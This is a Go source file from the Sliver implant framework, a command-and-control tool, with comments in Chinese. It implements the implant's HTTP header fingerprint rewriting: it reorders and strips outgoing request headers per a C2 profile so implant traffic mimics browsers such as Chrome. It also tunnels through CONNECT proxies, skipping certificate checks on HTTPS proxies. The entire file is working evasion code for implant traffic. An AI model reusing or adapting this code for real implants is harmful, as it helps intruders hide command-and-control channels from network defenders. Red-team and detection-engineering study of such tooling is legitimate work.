package httpclient

/*
	Sliver Implant Framework
	Copyright (C) 2026  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if or .HTTPC2ImplantConfig.HttpHeaderOrder .HTTPC2ImplantConfig.HttpSuppressHeaders}}

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"errors"
	"net"
	"net/http"
	"net/url"
	"strings"
)

// 构建期由 C2 Profile 模板注入(JA4H 应用层指纹定制):
//   - httpHeaderOrderStr: 逗号分隔的 header 名列表,定义出站请求头块的线上顺序;
//     输出时名字的大小写采用该列表中的写法(可全小写模拟 Chrome)。
//   - httpSuppressHeadersStr: 逗号分隔的 header 名列表,从出站请求中移除。
var (
	httpHeaderOrderStr     = "{{.HTTPC2ImplantConfig.HttpHeaderOrder}}"
	httpSuppressHeadersStr = "{{.HTTPC2ImplantConfig.HttpSuppressHeaders}}"
)

// maxFingerprintHeaderBytes - 头块缓冲上限;超限说明不是 HTTP 请求头块,原样透传
const maxFingerprintHeaderBytes = 32 * 1024

// fingerprintConn - 包装 net.Conn,在明文写入方向拦截并改写第一个 HTTP 请求头块
// (按 profile 定义的顺序重排、删除被抑制的头)。TLS 场景下包装的是握手完成后的
// 连接,因此改写发生在加密之前,线上字节即为定制后的头块。
// 注意:Sliver 的 transport 使用 IdleConnTimeout=1ms,连接基本不复用;
// 每个连接只改写第一个头块,之后的写入原样透传(不触碰响应与请求体)。
type fingerprintConn struct {
	net.Conn
	order       []string        // 配置的大小写原文,按序
	orderLower  []string        // 对应的小写匹配键
	suppress    map[string]bool // 小写名集合
	rewritten   bool
	pending     bytes.Buffer
	brokenState bool // 头块异常时永久透传,绝不破坏协议
}

func newFingerprintConn(conn net.Conn) *fingerprintConn {
	fc := &fingerprintConn{
		Conn:     conn,
		suppress: map[string]bool{},
	}
	for _, name := range splitHeaderList(httpHeaderOrderStr) {
		fc.order = append(fc.order, name)
		fc.orderLower = append(fc.orderLower, strings.ToLower(name))
	}
	for _, name := range splitHeaderList(httpSuppressHeadersStr) {
		fc.suppress[strings.ToLower(name)] = true
	}
	return fc
}

func splitHeaderList(value string) []string {
	names := []string{}
	for _, name := range strings.Split(value, ",") {
		name = strings.TrimSpace(name)
		if name != "" {
			names = append(names, name)
		}
	}
	return names
}

func (fc *fingerprintConn) Write(p []byte) (int, error) {
	if fc.rewritten || fc.brokenState || len(fc.order) == 0 && len(fc.suppress) == 0 {
		return fc.Conn.Write(p)
	}
	fc.pending.Write(p)
	data := fc.pending.Bytes()
	end := bytes.Index(data, []byte("\r\n\r\n"))
	if end < 0 {
		if len(data) > maxFingerprintHeaderBytes {
			// 不是可识别的头块(或异常巨大),放弃改写并透传
			fc.brokenState = true
			n, err := fc.Conn.Write(data)
			fc.pending.Reset()
			return n, err
		}
		// 头块尚未写完:返回 len(p) 让调用方继续写,不触碰底层连接
		return len(p), nil
	}
	headerBlock := data[:end+4]
	rest := data[end+4:]
	out := rewriteHeaderBlock(headerBlock, fc.order, fc.orderLower, fc.suppress)
	fc.pending.Reset()
	fc.rewritten = true
	if err := writeAll(fc.Conn, out); err != nil {
		return 0, err
	}
	if len(rest) > 0 {
		if err := writeAll(fc.Conn, rest); err != nil {
			return 0, err
		}
	}
	return len(p), nil
}

// writeAll - 完整写出,处理短写
func writeAll(conn net.Conn, data []byte) error {
	for len(data) > 0 {
		n, err := conn.Write(data)
		if err != nil {
			return err
		}
		data = data[n:]
	}
	return nil
}

// rewriteHeaderBlock - 重排请求头块。
// 结构:请求行 + N 个 "Name: value" 行 + 终止 \r\n。
// 未在 order 中列出的头按原始相对顺序追加;suppress 中的头被移除;
// order 中不存在于请求里的名字被忽略。请求行永不改动。
func rewriteHeaderBlock(block []byte, order, orderLower []string, suppress map[string]bool) []byte {
	lines := strings.Split(string(block), "\r\n")
	if len(lines) < 2 {
		return block
	}
	requestLine := lines[0]
	// 末尾两个空串来自 "\r\n\r\n"
	entries := []struct{ name, line string }{}
	for _, line := range lines[1:] {
		if line == "" {
			continue
		}
		idx := strings.Index(line, ":")
		if idx <= 0 {
			// 无法解析的行(不应出现):原样保留并置于队尾,保守处理
			entries = append(entries, struct{ name, line string }{strings.ToLower(line), line})
			continue
		}
		entries = append(entries, struct{ name, line string }{strings.ToLower(line[:idx]), line})
	}
	used := make([]bool, len(entries))
	var out bytes.Buffer
	out.WriteString(requestLine)
	out.WriteString("\r\n")
	for i, lower := range orderLower {
		if suppress[lower] {
			continue
		}
		for j := range entries {
			if !used[j] && entries[j].name == lower {
				used[j] = true
				// 名字大小写采用 profile 中的写法,值保持原样
				value := ""
				if idx := strings.Index(entries[j].line, ":"); idx > 0 {
					value = entries[j].line[idx+1:]
				}
				out.WriteString(order[i])
				out.WriteString(":")
				out.WriteString(value)
				out.WriteString("\r\n")
				break
			}
		}
	}
	for j := range entries {
		if used[j] {
			continue
		}
		if suppress[entries[j].name] {
			continue
		}
		out.WriteString(entries[j].line)
		out.WriteString("\r\n")
	}
	out.WriteString("\r\n")
	return out.Bytes()
}

// installRequestFingerprint - 把指纹改写器接入 transport。
// 必须在 uTLS 的 DialTLSContext 安装之后调用:存在则包装其返回值;
// 原生 HTTPS 路径需要接管拨号+握手(并自行处理代理隧道,因为
// DialTLSContext 生效时 transport.Proxy 被忽略);明文路径直接包装 Dial。
func installRequestFingerprint(transport *http.Transport, opts *HTTPOptions, proxyURL *url.URL, secure bool) {
	if base := transport.DialTLSContext; base != nil {
		transport.DialTLSContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
			conn, err := base(ctx, network, addr)
			if err != nil {
				return nil, err
			}
			return newFingerprintConn(conn), nil
		}
		return
	}
	if !secure {
		baseDial := transport.Dial
		if baseDial == nil {
			baseDial = (&net.Dialer{Timeout: opts.NetTimeout}).Dial
		}
		transport.Dial = func(network, addr string) (net.Conn, error) {
			conn, err := baseDial(network, addr)
			if err != nil {
				return nil, err
			}
			return newFingerprintConn(conn), nil
		}
		return
	}
	// 原生 TLS 接管:直连或经 http/https CONNECT 隧道,握手用 transport 的 TLSClientConfig
	transport.DialTLSContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
		dialer := &net.Dialer{Timeout: opts.NetTimeout}
		conn, err := fpDialTarget(ctx, dialer, addr, proxyURL, opts)
		if err != nil {
			return nil, err
		}
		host, _, err := net.SplitHostPort(addr)
		if err != nil {
			conn.Close()
			return nil, err
		}
		tlsConfig := transport.TLSClientConfig
		if tlsConfig == nil {
			tlsConfig = &tls.Config{}
		} else {
			tlsConfig = tlsConfig.Clone()
		}
		tlsConfig.ServerName = host
		tlsConn := tls.Client(conn, tlsConfig)
		handshakeCtx, cancel := context.WithTimeout(ctx, opts.TlsTimeout)
		defer cancel()
		if err := tlsConn.HandshakeContext(handshakeCtx); err != nil {
			conn.Close()
			return nil, err
		}
		return newFingerprintConn(tlsConn), nil
	}
}

// fpDialTarget / fpSendConnect - 与 utlsclient.go 同构的隧道建立逻辑。
// 独立实现是因为 utlsclient.go 整体受 TlsEnabled 门控,TlsEnabled=false
// 且仅启用 HTTP 层指纹时,渲染产物中不存在那套函数。socks 代理 fail closed。
func fpDialTarget(ctx context.Context, dialer *net.Dialer, target string, proxyURL *url.URL, opts *HTTPOptions) (net.Conn, error) {
	if proxyURL == nil {
		return dialer.DialContext(ctx, "tcp", target)
	}
	switch strings.ToLower(proxyURL.Scheme) {
	case "http", "https", "":
		break
	default:
		return nil, errors.New("header fingerprint rewrite with native TLS only supports http/https CONNECT proxies")
	}
	proxyAddr := proxyURL.Host
	if !strings.Contains(proxyAddr, ":") {
		if strings.EqualFold(proxyURL.Scheme, "https") {
			proxyAddr += ":443"
		} else {
			proxyAddr += ":80"
		}
	}
	conn, err := dialer.DialContext(ctx, "tcp", proxyAddr)
	if err != nil {
		return nil, err
	}
	if strings.EqualFold(proxyURL.Scheme, "https") {
		host, _, splitErr := net.SplitHostPort(proxyAddr)
		if splitErr != nil {
			host = proxyAddr
		}
		tlsConn := tls.Client(conn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
		if err := tlsConn.HandshakeContext(ctx); err != nil {
			conn.Close()
			return nil, err
		}
		conn = tlsConn
	}
	if err := fpSendConnect(conn, target, proxyURL, opts); err != nil {
		conn.Close()
		return nil, err
	}
	return conn, nil
}

func fpSendConnect(conn net.Conn, target string, proxyURL *url.URL, opts *HTTPOptions) error {
	host := target
	if !strings.Contains(host, ":") {
		host += ":443"
	}
	req := &http.Request{
		Method: http.MethodConnect,
		URL:    &url.URL{Opaque: host},
		Host:   host,
		Header: make(http.Header),
	}
	req.Header.Set("User-Agent", userAgent)
	username, password := opts.ProxyUsername, opts.ProxyPassword
	if username == "" && proxyURL.User != nil {
		username = proxyURL.User.Username()
		password, _ = proxyURL.User.Password()
	}
	if username != "" {
		token := base64.StdEncoding.EncodeToString([]byte(username + ":" + password))
		req.Header.Set("Proxy-Authorization", "Basic "+token)
	}
	if err := req.Write(conn); err != nil {
		return err
	}
	reader := bufio.NewReader(conn)
	resp, err := http.ReadResponse(reader, req)
	if err != nil {
		return err
	}
	if err := resp.Body.Close(); err != nil {
		return err
	}
	if resp.StatusCode != http.StatusOK {
		return errors.New("proxy CONNECT failed: " + resp.Status)
	}
	return nil
}

// {{end}} -HttpHeaderOrder/HttpSuppressHeaders
